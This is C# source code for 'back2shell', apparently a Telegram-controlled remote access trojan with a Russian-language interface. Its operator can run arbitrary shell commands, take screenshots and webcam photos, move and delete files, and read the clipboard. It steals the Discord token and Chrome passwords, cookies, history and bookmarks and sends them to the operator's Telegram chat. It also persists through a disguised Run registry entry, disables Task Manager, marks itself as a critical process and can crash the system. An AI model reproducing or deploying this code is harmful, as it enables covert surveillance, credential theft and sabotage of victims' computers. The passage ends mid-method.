using System;
using System.Threading;
using System.Threading.Tasks;
using System.Drawing;
using System.Runtime.InteropServices;
using Telegram.Bot;
using Telegram.Bot.Extensions.Polling;
using Telegram.Bot.Types;
using Telegram.Bot.Types.ReplyMarkups;
using Telegram.Bot.Types.InputFiles;
using System.Drawing.Imaging;
using System.IO;
using System.Diagnostics;
using System.Net;
using System.Net.NetworkInformation;
using System.Linq;
using TextCopy;
using System.Text;
using System.Collections.Generic;
using Monitor;
using StealerActions;
using Emgu.CV;

namespace back2shell_csharp
{


    class Program
    {

        // Settings / Настройки
        static private ITelegramBotClient bot = new TelegramBotClient("");
        static private ChatId chat_id = 0;
        static bool showlogs = true;
        static bool checkChatId = true;



        static string strComputerName = Environment.MachineName.ToString();
        static int temp_step = 0;

        public string GetMACAddress()
        {
            NetworkInterface[] nics = NetworkInterface.GetAllNetworkInterfaces();
            String sMacAddress = string.Empty;
            foreach (NetworkInterface adapter in nics)
            {
                if (sMacAddress == String.Empty)
                {
                    IPInterfaceProperties properties = adapter.GetIPProperties();
                    sMacAddress = adapter.GetPhysicalAddress().ToString();
                }
            }
            return sMacAddress;
        }
        public static async Task HandleUpdateAsync(ITelegramBotClient botClient, Update update, CancellationToken cancellationToken)
        {
            if (showlogs == true)
            {
                Console.WriteLine(Newtonsoft.Json.JsonConvert.SerializeObject(update));
            }
            if (update.Type == Telegram.Bot.Types.Enums.UpdateType.Message)
            {
                var message = update.Message;

                if (checkChatId == true)
                {
                    if (message.Chat != chat_id)
                    {
                        await botClient.SendTextMessageAsync(chat_id, "Пользователь (ChatId: " + message.Chat + ") попытался использовать бота.");
                        return;
                    }
                }

                if (message.Text == "/start")
                {
                    var replaykeyboard = new ReplyKeyboardMarkup(new[]
                   {

                        new[]
                       {
                            new KeyboardButton("💻 Основное"),
                            new KeyboardButton("⌨️ Клавиатура"),
                            new KeyboardButton("🚧 Процессы")

                        },

                        new[]
                       {
                            new KeyboardButton("🎉 Веселье"),
                            new KeyboardButton("🔑 Стиллеры")
                        }
                    });
                    replaykeyboard.ResizeKeyboard = true;
                    await botClient.SendTextMessageAsync(message.Chat, "back2shell - Программа Удаленного Администрирования. \n\nСоздано https://github.com/Maxdsdsdsd", replyMarkup: replaykeyboard);
                    return;
                }

                //if (message.Text != "/start")
                //{
                //    await botClient.DeleteMessageAsync(message.Chat, message.MessageId);
                //}

                if (message.Text == "📸 Сделать скриншот")
                {
                    var image = ScreenCapture.CaptureDesktop();
                    image.Save(@Path.GetTempPath() + "src.jpg", ImageFormat.Jpeg);
                    await botClient.SendTextMessageAsync(message.Chat, "Загрузка скриншота...");
                    InputOnlineFile imageFile = new InputOnlineFile(new MemoryStream(System.IO.File.ReadAllBytes(@Path.GetTempPath() + "src.jpg")));
                    await botClient.SendPhotoAsync(message.Chat, imageFile);
                    System.IO.File.Delete(@Path.GetTempPath() + "src.jpg");
                    return;
                }

                if (message.Text == "🤖 Отправить команду")
                {
                    await botClient.SendTextMessageAsync(message.Chat, "Введи команду для исполнения");
                    temp_step = 1;
                    return;
                }

                if (message.Text == "👁️ Получить информацию о ПК")
                {

                    string ip = "undefined";
                    WebClient web = new WebClient();
                    Stream stream = web.OpenRead("https://api.ipify.org");
                    using (StreamReader reader = new StreamReader(stream))
                    {
                        ip = reader.ReadToEnd();
                    }
                    string firstMacAddress = NetworkInterface.GetAllNetworkInterfaces().Where(nic => nic.OperationalStatus == OperationalStatus.Up && nic.NetworkInterfaceType != NetworkInterfaceType.Loopback).Select(nic => nic.GetPhysicalAddress().ToString()).FirstOrDefault();
                    await botClient.SendTextMessageAsync(message.Chat, "Информация о ПК: \n\nАйпи адрес: " + ip + "\nИмя ПК: " + strComputerName + "\nИмя Пользователя: " + Environment.UserName + "\nМак-Адрес: " + firstMacAddress + "\nОС: " + Environment.OSVersion);
                    return;
                }

                if (message.Text == "🛑 Выключить ПК")
                {
                    await botClient.SendTextMessageAsync(message.Chat, "Пк выключен.");
                    var psi = new ProcessStartInfo("shutdown", "/s /t 0");
                    psi.CreateNoWindow = true;
                    psi.UseShellExecute = false;
                    Process.Start(psi);
                    return;
                }

                if (message.Text == "🔄 Перезапустить ПК")
                {
                    await botClient.SendTextMessageAsync(message.Chat, "Пк перезагружен.");
                    var psi = new ProcessStartInfo("shutdown", "/r /t 0");
                    psi.CreateNoWindow = true;
                    psi.UseShellExecute = false;
                    Process.Start(psi);
                    return;
                }

                if (message.Text == "🚪 Выйти из пользователя")
                {
                    await botClient.SendTextMessageAsync(message.Chat, "Пользователь вышел.");
                    var psi = new ProcessStartInfo("shutdown", "/l /t 0");
                    psi.CreateNoWindow = true;
                    psi.UseShellExecute = false;
                    Process.Start(psi);
                    return;
                }

                if (message.Text == "☠️ Вызвать BSoD")
                {
                    System.Diagnostics.Process.GetProcessesByName("svchost")[0].Kill();
                    return;
                }

                if (message.Text == "▶️ Добавить в АвтоЗагрузку")
                {
                    Microsoft.Win32.RegistryKey key = Microsoft.Win32.Registry.CurrentUser.OpenSubKey("SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Run", true);
                    key.SetValue("WindowsHost", System.Reflection.Assembly.GetExecutingAssembly().Location);
                    return;
                }

                if (message.Text == "🖥️ Выключить Диспетчер Задач")
                {
                    ToggleTaskManager("1");
                    return;
                }

                if (message.Text == "🖥️ Включить Диспетчер Задач")
                {
                    ToggleTaskManager("0");
                    return;
                }

                if (message.Text == "📁 Скачать файл")
                {
                    await botClient.SendTextMessageAsync(message.Chat, "Введи путь к файлу");
                    temp_step = 2;
                    return;
                }

                if (message.Text == "📁 Загрузить файл")
                {
                    await botClient.SendTextMessageAsync(message.Chat, "Отправь сюда файл");

                    temp_step = 3;
                    return;
                }

                if (message.Text == "📁 Удалить файл")
                {
                    await botClient.SendTextMessageAsync(message.Chat, "Введи путь к файлу");

                    temp_step = 4;
                    return;
                }

                if (message.Text == "📄 Скопировать текст")
                {
                    await botClient.SendTextMessageAsync(message.Chat, "Введи текст для копирования");

                    temp_step = 5;
                    return;
                }

                if (message.Text == "📄 Получить текст из Буфера")
                {
                    await botClient.SendTextMessageAsync(message.Chat, "Текущий скопированный текст: " + ClipboardService.GetText());
                    return;
                }

                if (message.Text == "📄 Нажать клавишу")
                {
                    
                    await botClient.SendTextMessageAsync(message.Chat, "Введите клавишу или текст (Писать на английском, возможные клавиши https://ss64.com/vb/sendkeys.html)");

                    temp_step = 6;
                    return;
                }

                if (message.Text == "📄 Получить список процессов")
                {
                    string data1 = "";
                    Process[] processCollection = Process.GetProcesses();
                    foreach (Process p in processCollection)
                    {
                        data1 = data1 + p.ProcessName + ".exe\n";
                    }
                    string info = data1;
                    await botClient.SendTextMessageAsync(message.Chat, info);
                    return;
                }

                if (message.Text == "📄 Убить Процесс")
                {
                    await botClient.SendTextMessageAsync(message.Chat, "Введи название процесса:");

                    temp_step = 7;
                    return;
                }

                if (message.Text == "📄 Открыть Процесс")
                {
                    await botClient.SendTextMessageAsync(message.Chat, "Введи путь к программе:");

                    temp_step = 8;
                    return;
                }

                if (message.Text == "🥵 Нагрузить процессор")
                {
                    List<Thread> threads = new List<Thread>();
                    await botClient.SendTextMessageAsync(message.Chat, "Запушено!");
                    threads.Add(new Thread(new ThreadStart(KillCore)));
                    return;
                }

                if (message.Text == "🔒 Включить защиту от снятия процесса")
                {
                    [DllImport("ntdll.dll", SetLastError = true)]
                    static extern void RtlSetProcessIsCritical(UInt32 v1, UInt32 v2, UInt32 v3);
                    Process.EnterDebugMode();
                    RtlSetProcessIsCritical(1, 0, 0);
                    await botClient.SendTextMessageAsync(message.Chat, "Защита включена!");
                    return;
                }

                if (message.Text == "🔓 Выключить защиту от снятия процесса")
                {
                    [DllImport("ntdll.dll", SetLastError = true)]
                    static extern void RtlSetProcessIsCritical(UInt32 v1, UInt32 v2, UInt32 v3);
                    Process.EnterDebugMode();
                    RtlSetProcessIsCritical(0, 0, 0);
                    await botClient.SendTextMessageAsync(message.Chat, "Защита выключена!");
                    return;
                }

                if (message.Text == "💬 Отправить сообщение")
                {
                    await botClient.SendTextMessageAsync(message.Chat, "Введи текст:");

                    temp_step = 9;
                    return;
                }

                if (message.Text == "🗣 Произнести сообщение")
                {
                    await botClient.SendTextMessageAsync(message.Chat, "Введи текст (желательно на английском):");

                    temp_step = 10;
                    return;
                }

                if (message.Text == "🔊 Воиспроизвести звук")
                {
                    await botClient.SendTextMessageAsync(message.Chat, "Введи путь к звуку:");

                    temp_step = 11;
                    return;
                }

                if (message.Text == "🔗 Открыть URL")
                {
                    await botClient.SendTextMessageAsync(message.Chat, "Введи ссылку:");

                    temp_step = 12;
                    return;
                }

                if (message.Text == "📜 Сменить обои")
                {
                    await botClient.SendTextMessageAsync(message.Chat, "Введи путь к файлу:");

                    temp_step = 13;
                    return;
                }

                if (message.Text == "💿 Открыть CD Rom")
                {
                    using (FileStream fs = System.IO.File.Create(@Path.GetTempPath() + "b2s.vbs"))
                    {
                        byte[] info = new UTF8Encoding(true).GetBytes("CreateObject(\"WMPlayer.OCX.7\").cdromCollection.Item(i).Eject");
                        fs.Write(info, 0, info.Length);

                    }

                    Process cmd = new Process();
                    cmd.StartInfo.FileName = "cmd.exe";
                    cmd.StartInfo.RedirectStandardInput = true;
                    cmd.StartInfo.RedirectStandardOutput = true;
                    cmd.StartInfo.CreateNoWindow = true;
                    cmd.StartInfo.UseShellExecute = false;
                    cmd.Start();
                    cmd.StandardInput.WriteLine(@"C:\Windows\System32\cscript " + @Path.GetTempPath() + "b2s.vbs");
                    cmd.StandardInput.Flush();
                    cmd.StandardInput.Close();
                    cmd.WaitForExit();
                    System.IO.File.Delete(@Path.GetTempPath() + "b2s.vbs");

                    await botClient.SendTextMessageAsync(message.Chat, "CD Rom открыт");
                    return;
                }

                const int SW_HIDE = 0;
                const int SW_SHOW = 1;

                if (message.Text == "👎🏿 Скрыть TaskBar")
                {

                    [DllImport("user32.dll")]
                    static extern int FindWindow(string className, string windowText);
                    [DllImport("user32.dll")]
                    static extern int ShowWindow(int hwnd, int command);

                    int hwnd = FindWindow("Shell_TrayWnd", "");
                    ShowWindow(hwnd, SW_HIDE);

                    await botClient.SendTextMessageAsync(message.Chat, "TaskBar скрыт!");
                    return;
                }

                if (message.Text == "👍🏿 Показать TaskBar")
                {

                    [DllImport("user32.dll")]
                    static extern int FindWindow(string className, string windowText);
                    [DllImport("user32.dll")]
                    static extern int ShowWindow(int hwnd, int command);

                    int hwnd = FindWindow("Shell_TrayWnd", "");
                    ShowWindow(hwnd, SW_SHOW);

                    await botClient.SendTextMessageAsync(message.Chat, "TaskBar показан!");
                    return;
                }

                if (message.Text == "📁 Убить explorer")
                {
                    Process cmd = new Process();
                    cmd.StartInfo.FileName = "cmd.exe";
                    cmd.StartInfo.RedirectStandardInput = true;
                    cmd.StartInfo.RedirectStandardOutput = true;
                    cmd.StartInfo.CreateNoWindow = true;
                    cmd.StartInfo.UseShellExecute = false;
                    cmd.Start();
                    cmd.StandardInput.WriteLine("taskkill /f /im explorer.exe");
                    cmd.StandardInput.Flush();
                    cmd.StandardInput.Close();
                    cmd.WaitForExit();
                    await botClient.SendTextMessageAsync(message.Chat, "Explorer убит!");
                    return;
                }

                if (message.Text == "📁 Вернуть explorer")
                {
                    Process cmd = new Process();
                    cmd.StartInfo.FileName = "cmd.exe";
                    cmd.StartInfo.RedirectStandardInput = true;
                    cmd.StartInfo.RedirectStandardOutput = true;
                    cmd.StartInfo.CreateNoWindow = true;
                    cmd.StartInfo.UseShellExecute = false;
                    cmd.Start();
                    cmd.StandardInput.WriteLine("explorer");
                    cmd.StandardInput.Flush();
                    cmd.StandardInput.Close();
                    cmd.WaitForExit();
                    await botClient.SendTextMessageAsync(message.Chat, "Explorer вернут!");
                    return;
                }

                if (message.Text == "🔁 Повернуть экран (Пейзаж)")
                {
                    Display.ResetAllRotations();
                    await botClient.SendTextMessageAsync(message.Chat, "Экран перевернут.");
                    return;
                }

                if (message.Text == "🔁 Повернуть экран (Пейзаж Перевернутый)")
                {
                    Display.Rotate(1, Display.Orientations.DEGREES_CW_180);
                    await botClient.SendTextMessageAsync(message.Chat, "Экран перевернут.");
                    return;
                }

                if (message.Text == "🔑 Получить токен Дискорда")
                {
                    await botClient.SendTextMessageAsync(message.Chat, "Токен дискорда: " + Steal.getDiscordToken());
                    return;
                }

                if (message.Text == "🔑 Получить пароли Chrome")
                {
                    await botClient.SendTextMessageAsync(message.Chat, "Подождите...");
                    Steal.getChromePasswords();
                    InputOnlineFile documentFile = new InputOnlineFile(new MemoryStream(System.IO.File.ReadAllBytes("results/chrome_password.csv")));
                    await botClient.SendDocumentAsync(message.Chat, documentFile);
                    await botClient.SendTextMessageAsync(message.Chat, "Этот файл с паролями должен быть формата .csv и открываться через Excel.");
                    return;
                }

                if (message.Text == "🔑 Получить куки Chrome")
                {
                    await botClient.SendTextMessageAsync(message.Chat, "Подождите...");
                    Steal.getChromePasswords();
                    InputOnlineFile documentFile = new InputOnlineFile(new MemoryStream(System.IO.File.ReadAllBytes("results/chrome_cookie.csv")));
                    await botClient.SendDocumentAsync(message.Chat, documentFile);
                    await botClient.SendTextMessageAsync(message.Chat, "Этот файл с куки должен быть формата .csv и открываться через Excel.");
                    return;
                }

                if (message.Text == "🔑 Получить историю Chrome")
                {
                    await botClient.SendTextMessageAsync(message.Chat, "Подождите...");
                    Steal.getChromePasswords();
                    InputOnlineFile documentFile = new InputOnlineFile(new MemoryStream(System.IO.File.ReadAllBytes("chrome_history.csv")));
                    await botClient.SendDocumentAsync(message.Chat, documentFile);
                    await botClient.SendTextMessageAsync(message.Chat, "Этот файл с историей должен быть формата .csv и открываться через Excel.");
                    return;
                }

                if (message.Text == "🔑 Получить закладки Chrome")
                {
                    await botClient.SendTextMessageAsync(message.Chat, "Подождите...");
                    Steal.getChromePasswords();
                    InputOnlineFile documentFile = new InputOnlineFile(new MemoryStream(System.IO.File.ReadAllBytes("chrome_bookmark.csv")));
                    await botClient.SendDocumentAsync(message.Chat, documentFile);
                    await botClient.SendTextMessageAsync(message.Chat, "Этот файл с закладками должен быть формата .csv и открываться через Excel.");
                    return;
                }

                if (message.Text == "🔄 Добавить в автозагрузку")
                {
                    await botClient.SendTextMessageAsync(message.Chat, "Подождите...");
                    Microsoft.Win32.RegistryKey rkApp = Microsoft.Win32.Registry.CurrentUser.OpenSubKey("SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Run", true);
                    rkApp.SetValue("b2s", System.Reflection.Assembly.GetEntryAssembly().Location.ToString());
                    await botClient.SendTextMessageAsync(message.Chat, "Успешно добавлено в автозагрузку!");
                    return;
                }

                if (message.Text == "⏸ Убрать из автозагрузки")
                {
                    await botClient.SendTextMessageAsync(message.Chat, "Подождите...");
                    Microsoft.Win32.RegistryKey rkApp = Microsoft.Win32.Registry.CurrentUser.OpenSubKey("SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Run", true);

                    rkApp.DeleteValue("b2s", false);
                    await botClient.SendTextMessageAsync(message.Chat, "Успешно убрано из автозагрузки.");

                    return;
                }

                if (message.Text == "📸 Получить изображение с вебкамеры")
                {
                    await botClient.SendTextMessageAsync(message.Chat, "Загружаю...");

                    var filename = @Path.GetTempPath() + "srcweb.jpg";
                    using var capture = new VideoCapture(0, VideoCapture.API.DShow);
                    var image = capture.QueryFrame();
                    image.Save(filename);

                    InputOnlineFile imageFile = new InputOnlineFile(new MemoryStream(System.IO.File.ReadAllBytes(@Path.GetTempPath() + "srcweb.jpg")));
                    await botClient.SendPhotoAsync(message.Chat, imageFile);
                    System.IO.File.Delete(@Path.GetTempPath() + "src.jpg");
                    return;
                }





                if (temp_step == 1)
                {
                    Process cmd = new Process();
                    cmd.StartInfo.FileName = "cmd.exe";
                    cmd.StartInfo.RedirectStandardInput = true;
                    cmd.StartInfo.RedirectStandardOutput = true;
                    cmd.StartInfo.CreateNoWindow = true;
                    cmd.StartInfo.UseShellExecute = false;
                    cmd.Start();
                    cmd.StandardInput.WriteLine(message.Text);
                    cmd.StandardInput.Flush();
                    cmd.StandardInput.Close();
                    cmd.WaitForExit();
                    await botClient.SendTextMessageAsync(message.Chat, "Команда " + message.Text + " исполнена!\n\nЛоги: *\n\n" + cmd.StandardOutput.ReadToEnd() + "*");
                    temp_step = 0;
                }

                if (temp_step == 2)
                {
                    try
                    {
                        InputOnlineFile documentFile = new InputOnlineFile(new MemoryStream(System.IO.File.ReadAllBytes(@message.Text)));
                        await botClient.SendDocumentAsync(message.Chat, documentFile);
                    }
                    catch (FileNotFoundException)
                    {
                        await botClient.SendTextMessageAsync(message.Chat, "Файл не найден!");
                    }
                    catch (DirectoryNotFoundException)
                    {
                        await botClient.SendTextMessageAsync(message.Chat, "Ошибка, директория не найдена! (Нельзя отправить директорию!)");
                    }
                    catch (Exception ex)
                    {
                        await botClient.SendTextMessageAsync(message.Chat, "Ошибка: " + ex.ToString());
                    }
                    
                    temp_step = 0;
                }

                if (temp_step == 3)
                {
                    DownloadFile(message.Document.FileId, @Path.GetTempPath() + message.Document.FileName);

                    await botClient.SendTextMessageAsync(message.Chat, "Файл сохранен по пути: " + Path.GetTempPath() + message.Document.FileName);

                    temp_step = 0;
                }

                if (temp_step == 4)
                {
                    System.IO.File.Delete(message.Text);

                    temp_step = 0;
                }

                if (temp_step == 5)
                {
                    ClipboardService.SetText(message.Text);

                    await botClient.SendTextMessageAsync(message.Chat, "Текст " + message.Text + " скопирован!");
                    temp_step = 0;
                }

                if (temp_step == 6)
                {
                    using (FileStream fs = System.IO.File.Create(@Path.GetTempPath() + "b2s.vbs"))
                    {
                        byte[] info = new UTF8Encoding(true).GetBytes("Set WshShell = WScript.CreateObject(\"WScript.Shell\")\nWshShell.SendKeys \"" + message.Text +"\"");
                        fs.Write(info, 0, info.Length);

                    }

                    Process cmd = new Process();
                    cmd.StartInfo.FileName = "cmd.exe";
                    cmd.StartInfo.RedirectStandardInput = true;
                    cmd.StartInfo.RedirectStandardOutput = true;
                    cmd.StartInfo.CreateNoWindow = true;
                    cmd.StartInfo.UseShellExecute = false;
                    cmd.Start();
                    cmd.StandardInput.WriteLine(@"C:\Windows\System32\cscript " + @Path.GetTempPath() + "b2s.vbs");
                    cmd.StandardInput.Flush();
                    cmd.StandardInput.Close();
                    cmd.WaitForExit();
                    System.IO.File.Delete(@Path.GetTempPath() + "b2s.vbs");

                    await botClient.SendTextMessageAsync(message.Chat, "Клавиша " + message.Text + " нажата!");
                    temp_step = 0;
                }

                if (temp_step == 7)
                {
                    Process cmd = new Process();
                    cmd.StartInfo.FileName = "cmd.exe";
                    cmd.StartInfo.RedirectStandardInput = true;
                    cmd.StartInfo.RedirectStandardOutput = true;
                    cmd.StartInfo.CreateNoWindow = true;
                    cmd.StartInfo.UseShellExecute = false;
                    cmd.Start();
                    cmd.StandardInput.WriteLine("taskkill /f /im " + message.Text);
                    cmd.StandardInput.Flush();
                    cmd.StandardInput.Close();
                    cmd.WaitForExit();

                    await botClient.SendTextMessageAsync(message.Chat, "Процесс " + message.Text + " убит!");
                    temp_step = 0;
                }

                if (temp_step == 8)
                {
                    Process cmd = new Process();
                    cmd.StartInfo.FileName = "cmd.exe";
                    cmd.StartInfo.RedirectStandardInput = true;
                    cmd.StartInfo.RedirectStandardOutput = true;
                    cmd.StartInfo.CreateNoWindow = true;
                    cmd.StartInfo.UseShellExecute = false;
                    cmd.Start();
                    cmd.StandardInput.WriteLine("start \"\" \"" + message.Text + "\"");
                    cmd.StandardInput.Flush();
                    cmd.StandardInput.Close();
                    cmd.WaitForExit();

                    await botClient.SendTextMessageAsync(message.Chat, "Процесс " + message.Text + " открыт!");
                    temp_step = 0;
                }

                if (temp_step == 9)
                {
                    using (FileStream fs = System.IO.File.Create(@Path.GetTempPath() + "b2s.vbs"))
                    {
                        byte[] info = new UTF8Encoding(true).GetBytes("MsgBox \"" + message.Text + "\", vbSystemModal");
                        fs.Write(info, 0, info.Length);

                    }

                    Process cmd = new Process();
                    cmd.StartInfo.FileName = "cmd.exe";
                    cmd.StartInfo.RedirectStandardInput = true;
                    cmd.StartInfo.RedirectStandardOutput = true;
                    cmd.StartInfo.CreateNoWindow = true;
                    cmd.StartInfo.UseShellExecute = false;
                    cmd.Start();
                    cmd.StandardInput.WriteLine(@"C:\Windows\System32\cscript " + @Path.GetTempPath() + "b2s.vbs");
                    cmd.StandardInput.Flush();
                    cmd.StandardInput.Close();
                    cmd.WaitForExit();
                    System.IO.File.Delete(@Path.GetTempPath() + "b2s.vbs");

                    await botClient.SendTextMessageAsync(message.Chat, "Сообщение " + message.Text + " отправлено!");
                    temp_step = 0;
                }

                if (temp_step == 10)
                {
                    using (FileStream fs = System.IO.File.Create(@Path.GetTempPath() + "b2s.vbs"))
                    {
                        byte[] info = new UTF8Encoding(true).GetBytes("CreateObject(\"SAPI.SpVoice\").Speak\"" + message.Text + "\"");
                        fs.Write(info, 0, info.Length);

                    }

                    Process cmd = new Process();
                    cmd.StartInfo.FileName = "cmd.exe";
                    cmd.StartInfo.RedirectStandardInput = true;
                    cmd.StartInfo.RedirectStandardOutput = true;
                    cmd.StartInfo.CreateNoWindow = true;
                    cmd.StartInfo.UseShellExecute = false;
                    cmd.Start();
                    cmd.StandardInput.WriteLine(@"C:\Windows\System32\cscript " + @Path.GetTempPath() + "b2s.vbs");
                    cmd.StandardInput.Flush();
                    cmd.StandardInput.Close();
                    cmd.WaitForExit();
                    System.IO.File.Delete(@Path.GetTempPath() + "b2s.vbs");

                    await botClient.SendTextMessageAsync(message.Chat, "Сообщение " + message.Text + " произнесено!");
                    temp_step = 0;
                }

                if (temp_step == 11)
                {
                    using (FileStream fs = System.IO.File.Create(@Path.GetTempPath() + "b2s.vbs"))
                    {
                        byte[] info = new UTF8Encoding(true).GetBytes("Set WMP = WScript.CreateObject(\"MediaPlayer.MediaPlayer\",\"WMP_\")\nWMP.Open \"" + message.Text + "\"\nWMP.Play\nWScript.Sleep 7000");
                        fs.Write(info, 0, info.Length);

                    }

                    Process cmd = new Process();
                    cmd.StartInfo.FileName = "cmd.exe";
                    cmd.StartInfo.RedirectStandardInput = true;
                    cmd.StartInfo.RedirectStandardOutput = true;
                    cmd.StartInfo.CreateNoWindow = true;
                    cmd.StartInfo.UseShellExecute = false;
                    cmd.Start();
                    cmd.StandardInput.WriteLine(@"C:\Windows\System32\cscript " + @Path.GetTempPath() + "b2s.vbs");
                    cmd.StandardInput.Flush();
                    cmd.StandardInput.Close();
                    cmd.WaitForExit();
                    System.IO.File.Delete(@Path.GetTempPath() + "b2s.vbs");

                    await botClient.SendTextMessageAsync(message.Chat, "Звук по пути " + message.Text + " воспроизведен!");
                    temp_step = 0;
                }

                if (temp_step == 12)
                {
                    Process cmd = new Process();
                    cmd.StartInfo.FileName = "cmd.exe";
                    cmd.StartInfo.RedirectStandardInput = true;
                    cmd.StartInfo.RedirectStandardOutput = true;
                    cmd.StartInfo.CreateNoWindow = true;
                    cmd.StartInfo.UseShellExecute = false;
                    cmd.Start();
                    cmd.StandardInput.WriteLine("start \"\" \"" + message.Text + "\"");
                    cmd.StandardInput.Flush();
                    cmd.StandardInput.Close();
                    cmd.WaitForExit();

                    await botClient.SendTextMessageAsync(message.Chat, "Ссылка " + message.Text + " открыта!");
                    temp_step = 0;
                }

                if (temp_step == 13)
                {
                    Uri messagetext = new Uri(@message.Text);
                    Wallpaper.Set(messagetext, Wallpaper.Style.Fill);

                    await botClient.SendTextMessageAsync(message.Chat, "Обои " + message.Text + " установлены!");
                    temp_step = 0;
                }


                






                if (message.Text == "🔄 Назад")
                {
                    var replaykeyboard = new ReplyKeyboardMarkup(new[]
                   {

                        new[]
                       {
                            new KeyboardButton("💻 Основное"),
                            new KeyboardButton("⌨️ Клавиатура"),
                            new KeyboardButton("🚧 Процессы")

                        },

                        new[]
                       {
                            new KeyboardButton("🎉 Веселье"),
                            new KeyboardButton("🔑 Стиллеры")
                        }
                    });
                    replaykeyboard.ResizeKeyboard = true;
                    await botClient.SendTextMessageAsync(message.Chat, "back2shell - Программа Удаленного Администрирования. \n\nСоздано https://github.com/Maxdsdsdsd", replyMarkup: replaykeyboard);
                    return;
                }

                if (message.Text == "💻 Основное")
                {
                    var replaykeyboard = new ReplyKeyboardMarkup(new[]
                   {

                        new[]
                       {
                            new KeyboardButton("📸 Сделать скриншот"),
                            new KeyboardButton("🤖 Отправить команду"),
                            new KeyboardButton("👁️ Получить информацию о ПК")

                        },
                        new[]
                       {
                            new KeyboardButton("📸 Получить изображение с вебкамеры"),
                            new KeyboardButton("🛑 Выключить ПК"),
                            new KeyboardButton("🔄 Перезапустить ПК")
                        },
                        new[]
                       {
                            new KeyboardButton("🚪 Выйти из пользователя"),
                            new KeyboardButton("☠️ Вызвать BSoD"),
                            new KeyboardButton("▶️ Добавить в АвтоЗагрузку")
                        },
                        new[]
                       {
                            new KeyboardButton("🖥️ Выключить Диспетчер Задач"),
                            new KeyboardButton("🖥️ Включить Диспетчер Задач"),
                            new KeyboardButton("📁 Загрузить файл")
                        },
                        new[]
                       {
                            new KeyboardButton("📁 Скачать файл"),
                            new KeyboardButton("📁 Удалить файл"),
                            new KeyboardButton("🔄 Назад")
                        }
                    });
                    await botClient.SendTextMessageAsync(message.Chat, "Основное меню.", replyMarkup: replaykeyboard);
                    return;
                }
                if (message.Text == "⌨️ Клавиатура")
                {
                    var replaykeyboard = new ReplyKeyboardMarkup(new[]
                   {

                        new[]
                       {
                            new KeyboardButton("📄 Скопировать текст"),
                            new KeyboardButton("📄 Получить текст из Буфера"),
                            new KeyboardButton("📄 Нажать клавишу")

                        },
                        new[]
                       {
                            new KeyboardButton("🔄 Назад")
                        }
                    });
                    await botClient.SendTextMessageAsync(message.Chat, "Клавиатурное меню.", replyMarkup: replaykeyboard);
                    return;
                }
                if (message.Text == "🚧 Процессы")
                {
                    var replaykeyboard = new ReplyKeyboardMarkup(new[]
                   {

                        new[]
                       {
                            new KeyboardButton("📄 Получить список процессов"),
                            new KeyboardButton("📄 Убить Процесс"),
                            new KeyboardButton("📄 Открыть Процесс")

                        },
                        new[]
                       {
                            new KeyboardButton("🥵 Нагрузить процессор"),
                            new KeyboardButton("🔒 Включить защиту от снятия процесса"),
                            new KeyboardButton("🔓 Выключить защиту от снятия процесса")
                        },
                        new[]
                       {
                            new KeyboardButton("🔄 Добавить в автозагрузку"),
                            new KeyboardButton("⏸ Убрать из автозагрузки"),
                            new KeyboardButton("🔄 Назад")
                        }
                    });
                    await botClient.SendTextMessageAsync(message.Chat, "Меню процессов.", replyMarkup: replaykeyboard);
                    return;
                }
                if (message.Text == "🎉 Веселье")
                {
                    var replaykeyboard = new ReplyKeyboardMarkup(new[]
                   {

                        new[]
                       {
                            new KeyboardButton("💬 Отправить сообщение"),
                            new KeyboardButton("🗣 Произнести сообщение"),
                            new KeyboardButton("🔊 Воиспроизвести звук")

                        },
                        new[]
                       {
                            new KeyboardButton("🔗 Открыть URL"),
                            new KeyboardButton("📜 Сменить обои"),
                            new KeyboardButton("💿 Открыть CD Rom")
                        },
                        new[]
                       {
                            new KeyboardButton("👎🏿 Скрыть TaskBar"),
                            new KeyboardButton("👍🏿 Показать TaskBar"),
                            new KeyboardButton("📁 Убить explorer")
                        },
                        new[]
                       {
                            new KeyboardButton("📁 Вернуть explorer"),
                            new KeyboardButton("🔁 Повернуть экран (Пейзаж)"),
                            new KeyboardButton("🔁 Повернуть экран (Пейзаж Перевернутый)")
                        },
                        new[]
                       {
                            new KeyboardButton("🔄 Назад")
                        }
                    });
                    await botClient.SendTextMessageAsync(message.Chat, "Меню веселья.", replyMarkup: replaykeyboard);
                    return;
                }
                if (message.Text == "🔑 Стиллеры")
                {
                    var replaykeyboard = new ReplyKeyboardMarkup(new[]
                   {

                        new[]
                       {
                            new KeyboardButton("🔑 Получить токен Дискорда"),
                            new KeyboardButton("🔑 Получить пароли Chrome"),
                            new KeyboardButton("🔑 Получить куки Chrome"),
                            new KeyboardButton("🔑 Получить историю Chrome"),
                            new KeyboardButton("🔑 Получить закладки Chrome"),
                            new KeyboardButton("🔄 Назад")

                        }
                    });
                    await botClient.SendTextMessageAsync(message.Chat, "Меню стиллеров.", replyMarkup: replaykeyboard);
                    return;
                }
                
            }
        }

        

        public static async Task HandleErrorAsync(ITelegramBotClient botClient, Exception exception, CancellationToken cancellationToken)
        {
            Console.WriteLine(exception);
        }

        public static void ToggleTaskManager(string keyValue)
        {
            Microsoft.Win32.RegistryKey objRegistryKey = Microsoft.Win32.Registry.CurrentUser.CreateSubKey("Software\\Microsoft\\Windows\\CurrentVersion\\Policies\\System");
            objRegistryKey.SetValue("DisableTaskMgr", keyValue);
            objRegistryKey.Close();
        }

        static async void DownloadFile(string fileId, string path)
        {
            try
            {
                var file = await bot.GetFileAsync(fileId);

                using (var saveImageStream = new FileStream(path, FileMode.Create))
                {
                    await bot.DownloadFileAsync(file.FilePath, saveImageStream);
                }
            }
            catch (Exception ex)
            {
                Console.WriteLine("Error downloading: " + ex.Message);
            }
        }

        

        static public void KillCore()
        {
            Random rand = new Random();
            long num = 0;
            while (true)
            {
                num += rand.Next(100, 1000);
                if (num > 1000000) { num = 0; }
            }
        }

       

        public sealed class Wallpaper
        {
            Wallpaper() { }

            const int SPI_SETDESKWALLPAPER = 20;
            const int SPIF_UPDATEINIFILE = 0x01;
            const int SPIF_SENDWININICHANGE = 0x02;

            [DllImport("user32.dll", CharSet = CharSet.Auto)]
            static extern int SystemParametersInfo(int uAction, int uParam, string lpvParam, int fuWinIni);

            public enum Style : int
            {
                Tile,
                Center,
                Stretch,
                Fill,
                Fit,
                Span
            }

            public static void Set(Uri uri, Style style)
            {
                System.IO.Stream s = new WebClient().OpenRead(uri.ToString());

